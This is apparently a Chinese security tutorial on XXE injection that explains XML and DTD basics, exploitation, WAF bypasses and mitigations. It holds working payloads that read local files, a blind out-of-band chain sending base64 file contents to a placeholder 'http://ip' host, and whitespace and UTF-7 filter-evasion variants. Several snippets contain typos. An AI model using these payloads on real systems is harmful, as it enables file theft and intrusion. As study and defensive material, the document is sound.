## 一、漏洞原理

### 1、简介

```xml
<!-- 解释 -->
XXE(XML External Lnjection)外部实体注入，当应用程序允许引用外部实体时，通过XXE，攻击者可以实现任意文件读取，DOS拒绝服务攻击以及代理扫描内网等
```

```xml
<!-- 危害 -->
1、任意文件读取
2、DOS攻击
3、命令执行
4、内网探测(SSRF)
```

### 2、详情

```xml
<!-- 成因 -->
运维人员使用了低版本的php，libxml低于2.9.1就会造成XXE或者程序员设置了libxml_disable_entity_loader(FALSE);
```

### 3、XML_基础

​	3.1、简介

```xml
<!-- 解释 -->
XML(EXtensibleMarkup Language)可扩展标记语言，类似HTML。用于传输数据而非显示数据，标签没有被预定义，需要自行定义标签
```

```xml
<!-- XML与HTML -->
1、HTML用于显示信息，XML用于传输信息
2、HTML用于显示数据，焦点是数据的外观；XML用于传输数据，焦点是数据的内容
```

```xml
<!-- 用途 -->
应用于Web开发的许多方面，常用于简化数据的存储和共享。
XML把数据从HTML分离
```

```xml
<!-- XML DOM -->
有且只有一个根元素		
<?xml version="1.0" encoding="ISO-8859-1"?>	<!-- XML声明：XML版本 编码方式 -->
<note>		<!-- 根元素的开始 -->
	<to>George</to>			<!-- 4个子元素：to from heading body -->
    <from>John</from>
    <heading>Reminder</heading>
   	<body>Don't forget the meeting</body>
</note>		<!-- 根元素的结束 -->
```

​	3.2、模块

```xml
<!-- 元素 -->
元素指从开始标签直到结束标签的部分。元素可包含其他元素、文本、属性。
```

```xml
<!-- 属性 -->
解释：属性(Attribute)提供关于元素的额外信息。属性总是以名称/值的形式成对出现。
语法：
	<gangstername='George "Shotgun" Ziegler'></gangstername>
	或实体引用
	<gangstername='George &quot;Shotgun&quot; Ziegler'></gangstername>
```

```xml
<!-- 实体 -->
解释：
	实体是用来定义普通文本的变量，实体引用是对实体的引用。在XML中，只有"<"和"&"是非法的，非法的XML字符必须被替换为实体引用。
预定义：
       	&lt;	<	小于
        &gt;	>	大于
        &amp;	&	和号
        &apos;	'	单引号
        &quot;	"	双引号
```

```xml
<!-- PCDATA -->
解释：PCDATA(Parsed Character data)，被解析的字符数据。文本中的标签会被当作标记来处理，实体也会被展开。
```

```xml
<!-- CDATA -->
1、解释：
	CDATA(Character Data)，字符数据。不会被解析器解析的文本，文本中的标签不会被当作标记来对待，其中的实体也不会被展开。
2、语法：
	<![CDATA[xxx]]>
3、补充：
	CDATA部分不能包含字符串"]]>"，也不允许嵌套CDATA。
	CDATA部分结尾的"]]>"不能包含空格或换行
```

​	3.3、验证

```xml
<!-- 语法规则 -->
1、XML文档必须有根元素
2、XML文档必须有关闭标签
3、XML标签对大小写敏感
4、XML元素必须被正确的嵌套
5、XML属性必须加引号
6、验证XML文档
```

```xml
<!-- 注释 -->
<!-- This is a comment -->
```

### 4、XML_DTD

​	4.1、简介

```xml
<!-- 解释 -->
DTD(Document Type Definition)文档类型定义，可定义合法的XML文档构建模块，定义XML文件的结构、语法规则。
```

```xml
<!-- 内部DOCTYPE声明 -->
DTD被包含在XML源文件中
格式：<!DOCTYPE 根元素 [元素声明]>
```

```xml
<!-- 外部文档声明 -->
DTD位于XML源文件外部
格式：<!DOCTYPE 根元素 SYSTEM "文件名">
```

​	4.2、元素

```xml
<!-- 声明元素 -->
格式：<!ELEMENT 元素名称 类别> 或 <!ELEMENT 元素名称 (元素内容)>
1、空元素
2、只有PCDATA的元素
3、带有任何内容的元素
4、带有子元素的元素
5、只出现一次的元素
6、最少出现一次的元素
7、出现零次或多次的元素
8、出现零次或一次的元素
9、混合型的内容
```

​	4.3、属性

```xml
<!-- 声明属性 -->
格式：<!ATTLIST 元素名称 属性名称 属性类型 默认值>
	DTD实例：<!ATTLIST payment type CDATA "check">
	XML实例：<payment type="check" />
1、#IMPLIED
2、#REQUIRED
3、#FIXED
```

​	4.4、实体

```xml
<!-- 解释 -->
一个实体由三部分组成：一个和号&，一个实体名称，一个分号;
```

```xml
<!-- 内部实体声明 -->
格式：<!ENTITY 实体名称 "实体值">
	DTD实例：<!ENTITY writer"Bill Gates">
		    <!ENTITY copyright"Copyright W3School.com.cn">
	XML实例：<author>&write;&copyright;</author>
```

```xml
<!-- 外部实体声明 -->
格式：<!ENTITY 实体名称 SYSTEM "URI/URL">
	DTD实例：<!ENTITY writer SYSTEM "http://www.baidu.com/1.dtd">
		    <!ENTITY copyright SYSTEM "http://www.baidu.com/2.dtd">
	XML实例：<author>&writer;&copyright;</author>
```

```xml
<!-- 参数实体声明 -->
格式：<!ENTITY % 实体名称 "实体值">
	 or
	 <!ENTITY % 实体名称 SYSTEM "URL">
实例：
	dtd内容：<!ENTITY evil SYSTEM "file:///c:/windows/win.ini" >
	XML内容：<!DOCTYPE foo [<!ELEMENT foo ANY >
		    <!ENTITY % xxe SYSTEM "http://ip/1.dtd" >
		    xxe;]>
		    <foo>&evil;</foo>
```

```xml
<!-- 引用公共实体 -->
格式：<!ENTITY 实体名称 PUBLIC "public_ID" "URI">
	XML实例：<!DOCTYPE foo [<!ELEMENT foo ANY >
		    <!ENTITY % xee PUBLIC "public_ID" "http://ip/q.dtd" >
		    %xxe;]>
		    <foo>&evil;</foo>
```



## 二、漏洞特征

### 1、场景

```xml
<!-- 广义 -->
1、数据传输
2、WEB服务
3、内容管理
4、WEB集成
5、文件配置
```

```xml
<!-- 狭义 -->
1、互联网
2、政府电子政务
3、城市计划
4、土地管理
5、电力
6、气象
7、房地产
8、电信
9、水利
10、农业
```

### 2、发现

​	2.1、任何HTTP数据传输的地方都可以测试

​	2.2、EXCEL



## 三、利用方法

### 1、有回显注入

```xml
<!-- 外部实体调用file://读取本地文件 -->
<!DOCTYPE foo [<!ELEMENT foo ANY>
<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<foo>&xee;</foo>
```

```xml
<!-- 外部实体调用远程dtd文件 -->
Payload：
<!DOCTYPE foo [<!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "http://ip/1.dtd" >
%xxe;]>

远程1.dtd：
<!ENTITY evil SYSTEM "file:///c:/windows/win.ini" >
```

### 2、无回显注入

```xml
<!-- 思路 -->
VPS创建tdt文件，成功利用以后如果无报错，直接查看日志内容可看到base64编码后的数据
```

```xml
<!-- 1.dtd -->
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///c:/windows/win.ini">
<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://ip?p=%file;'>">
```

```xml
<!-- Payload -->
<!DOCTYPE convert [
<!ENTITY % remote SYSTEM "http://ip/1.dtd">
%remote;%int;%send;
]>
```

### 3、核心要素

​	3.1、闭合标签

​	3.2、掌握XML内部结构



## 四、绕过防护

### 1、使用空格

```xml
<!-- 原因 -->
通常XXE漏洞存在于XML文档开头，部分WAF会使用正则表达式检测XML开头的字符串，但是XML格式在设置标签属性格式时，允许使用任意数量的空格，从而实现绕过此类型防护
```

```xml
<!-- 原文 -->
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE test [
<!ENTITY % file SYSTEM "php://filter/read=convert-base64.encode/resource=/flag.txt">
<!ENTITY % remote SYSTEM "http://vps-ip/test.dtd">
%remote;
%dtd;
%xxe;
]>
```

```xml
<!-- 绕过 -->
<?xml              



                                                                                   
version="1.0" encoding="utf-8"?>
<!DOCTYPE test [
<!ENTITY % file SYSTEM "php://filter/read=convert-base64.encode/resource=/flag.txt">
<!ENTITY % remote SYSTEM "http://vps-ip/test.dtd">
%remote;
%dtd;
%xxe;
]>

```

### 2、使用UTF-7

```xml
<!-- 原因 -->
大部分WAF会对关键词过滤，可以使用UTF-7绕过此类型防护
```

```xml
<!-- 原文 -->
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE test [
<!ENTITY % file SYSTEM "php://filter/read=convert-base64.encode/resource=/flag.txt">
<!ENTITY % remote SYSTEM "http://vps-ip/test.dtd">
%remote;
%dtd;
%xxe;
]>
```

```xml
<!-- 绕过 -->
<?xml version="1.0" encoding="utf-7"?>
+ADwAIQ-DOCTYPE test +AFs-
+ADwAIQ-ENTITY +ACU- file SYSTEM +ACI-php://filter/read+AD0-convert-base64.encode/resource+AD0-/flag.txt+ACIAPg-
+ADwAIQ-ENTITY +ACU- remote SYSTEM +ACI-http://vps-ip/test.dtd+ACIAPg-
+ACU-remote+ADs-
+ACU-dtd+ADs-
+ACU-xxe+ADs-
+AF0APg-
```



## 五、实战思路

### 1、常规

​	1.1、检测Accept是否接受XML类型

```xml
<!-- 接受才能下一步 -->
不接受则手动添加 Content-Type:application/xml 或 text/xml
```

​	1.2、检测XML是否会被解析

```xml
<!-- 正常解析才能下一步 -->
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE ANY [
	<!ENTITY test "this is test" >
]>
<root>&test;</root>
```

​	1.2、检测服务器是否支持外部实体

```xml
<!-- 正常接收才能下一步 -->
<?xml version="1.0" encoding="utf-8" >
<!DOCTYPE ANY [
	<!ENTITY % shit SYSTEM "http://ip/1.xml">
%shit;
]>
```



## 六、相关工具

### 1、XXER

```xml
<!-- 下载 -->
https://github.com/TheTwitchy/xxer
```

```xml
<!-- 参数 -->
-h			获取帮助
-p http	     指定HTTP端口
-p ftp		指定FTP端口
-H			指定目标IP
-d DTD		指定DTD模板
```

```xml
<!-- 用法 -->
python2 xxer.py -p 8989 -H 192.168.174.1
```



## 七、防护措施

### 1、过滤XML数据

```xml
<!-- 关键词 -->
<!DOCTYPE
<!ENTITY
SYSTEM
PUBLIC
```

### 2、禁用外部实体

```xml
<!-- 方法 -->
PHP：libxml_disable_entity_loader(true);
JAVA：DocumentBuilderFactory dbf = DocumentBuilderFactory.newlnstance();
	 dbf.setExpandEntityReferences(false);
Python：from lxml import etreexmlData = etree.parse(xmlSource,etree,XMLParser(resolve_entities=False))
```

### 3、升级Libxml

```xml
Libxml2.9默认可以防御XML实体攻击
```



## 八、其他补充

### 1、协议

```xml
<!-- libxml2 -->
file
http
ftp
```

```xml
<!-- PHP -->
file
http
ftp
php
compress.zlib
compress.bzip2
data
glob
phar
```

```xml
<!-- Java -->
http
https
ftp
file
jar
netdoc
mailto
gopher *
```

```xml
<!-- .NET -->
file
http
https
ftp
```

